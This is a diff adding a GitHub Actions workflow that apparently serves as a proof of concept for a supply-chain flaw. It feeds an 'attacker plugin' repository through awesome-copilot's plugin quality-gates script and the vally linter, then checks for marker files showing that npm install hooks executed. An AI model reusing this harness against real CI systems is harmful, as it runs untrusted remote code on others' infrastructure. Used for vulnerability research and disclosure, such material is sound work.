@@ -1,0 +1,135 @@
+name: Quality Gates Exact Proof
+on: workflow_dispatch
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          
+      - name: Install tools
+        run: |
+          set +e
+          npm install -g @github/copilot 2>&1 | tail -3
+          copilot --version
+          
+      - name: Clone awesome-copilot eng scripts
+        run: |
+          echo "=== Cloning awesome-copilot for quality gates scripts ==="
+          mkdir -p /tmp/ac
+          cd /tmp/ac
+          git init -q
+          git remote add origin https://github.com/github/awesome-copilot.git
+          git fetch --depth=1 origin main
+          git checkout --detach FETCH_HEAD
+          echo "=== Quality gates files ==="
+          ls -la eng/external-plugin-*.mjs
+          
+      - name: Install quality gates dependencies
+        run: |
+          cd /tmp/ac
+          npm install @microsoft/vally 2>&1 | tail -5
+          echo "Dependencies installed"
+          
+      - name: Run EXACT quality gates against attacker plugin
+        run: |
+          set +e
+          cd /tmp/ac
+          echo "=== Running quality gates script ==="
+          PLUGIN_JSON='[{"name":"proof-of-concept-plugin","source":{"repo":"blooddiamondz/copilot-plugin-proof","ref":"main","path":"."},"keywords":[]}]'
+          
+          # Run with verbose output
+          node eng/external-plugin-pr-quality-gates.mjs --plugins-json "$PLUGIN_JSON" 2>&1
+          EXIT=$?
+          echo "Exit code: $EXIT"
+          
+          echo ""
+          echo "=== CHECK IF ATTACKER CODE EXECUTED ==="
+          if [ -f /tmp/copilot_rce_proof.txt ]; then
+            echo "🔥🔥🔥🔥🔥 POSTINSTALL HOOK EXECUTED!"
+            cat /tmp/copilot_rce_proof.txt
+          else
+            echo "postinstall did NOT execute"
+          fi
+          
+          if [ -f /tmp/copilot_preinstall_proof.txt ]; then
+            echo "🔥🔥🔥🔥🔥 PREINSTALL HOOK EXECUTED!"
+            cat /tmp/copilot_preinstall_proof.txt
+          else
+            echo "preinstall did NOT execute"
+          fi
+          
+          echo ""
+          echo "=== Check ALL temp files created ==="
+          find /tmp -maxdepth 2 -name "*proof*" -o -name "*rce*" -o -name "*install*" 2>/dev/null | head -10
+          
+          echo ""
+          echo "=== Check if attacker repo was cloned ==="
+          find /tmp -name "submission" -type d 2>/dev/null | head -5
+          SUBDIR=$(find /tmp -name "submission" -type d 2>/dev/null | head -1)
+          if [ -n "$SUBDIR" ]; then
+            echo "Found submission dir: $SUBDIR"
+            ls -la "$SUBDIR/" 2>/dev/null
+            echo "=== package.json in submission ==="
+            cat "$SUBDIR/package.json" 2>/dev/null || echo "No package.json"
+          fi
+          
+          echo ""
+          echo "=== Check copilot installed plugins ==="
+          find /tmp -path "*/installed-plugins/*" -type f 2>/dev/null | head -10
+          find /tmp -path "*copilot*" -type d 2>/dev/null | head -10
+          
+      - name: Test vally lint behavior
+        run: |
+          set +e
+          echo "=== Test vally lint on attacker repo directly ==="
+          mkdir -p /tmp/vally-test
+          cd /tmp/vally-test
+          git clone --depth=1 https://github.com/blooddiamondz/copilot-plugin-proof.git .
+          echo "=== Files ==="
+          ls -la
+          
+          # Run vally lint directly
+          cd /tmp/ac
+          node -e "
+          const { runLint, LintConsoleReporter } = require('@microsoft/vally');
+          const { Writable } = require('stream');
+          
+          async function main() {
+            const chunks = [];
+            const stream = new Writable({
+              write(chunk, enc, cb) { chunks.push(chunk.toString()); cb(); }
+            });
+            
+            try {
+              const result = await runLint({ rootPath: '/tmp/vally-test' });
+              const reporter = new LintConsoleReporter({ verbose: true, stream });
+              await reporter.report(result);
+              console.log('Lint output:', chunks.join(''));
+              console.log('Lint passed:', result.passed);
+            } catch(e) {
+              console.log('Lint error:', e.message);
+            }
+            
+            // Check if anything executed
+            const fs = require('fs');
+            if (fs.existsSync('/tmp/copilot_rce_proof.txt')) {
+              console.log('🔥 VALLY LINT CAUSED CODE EXECUTION!');
+            } else {
+              console.log('Vally lint did NOT cause code execution');
+            }
+          }
+          main();
+          " 2>&1
+          
+      - name: Final check
+        if: always()
+        run: |
+          echo "========================================"
+          echo "  FINAL EXECUTION CHECK"
+          echo "========================================"
+          ls -la /tmp/copilot_rce_proof.txt 2>/dev/null && echo "FILE EXISTS: postinstall ran" || echo "NO FILE: postinstall did not run"
+          ls -la /tmp/copilot_preinstall_proof.txt 2>/dev/null && echo "FILE EXISTS: preinstall ran" || echo "NO FILE: preinstall did not run"
+          echo "=== ALL DONE ==="
